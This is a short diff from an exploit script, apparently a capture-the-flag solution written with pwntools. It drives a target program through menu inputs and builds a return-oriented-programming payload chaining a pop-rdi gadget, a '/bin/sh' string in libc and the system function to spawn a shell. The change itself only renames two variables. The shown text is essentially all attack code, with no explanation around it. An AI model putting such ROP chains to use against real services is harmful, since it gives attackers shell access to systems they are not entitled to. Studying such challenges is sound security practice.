@@ -26,7 +26,7 @@ for i in range(3):
     r.sendlineafter(b': ', b'1')
     r.sendlineafter(b': ', b'2')
 
-payload = flat(pop_rdi, binsh, ret, lib.sym.system, 5)
+payload = flat(pop_rdi_ret, binsh_libc, ret, lib.sym.system, 5)
 
 r.sendline(payload)
 r.sendline(b'-')
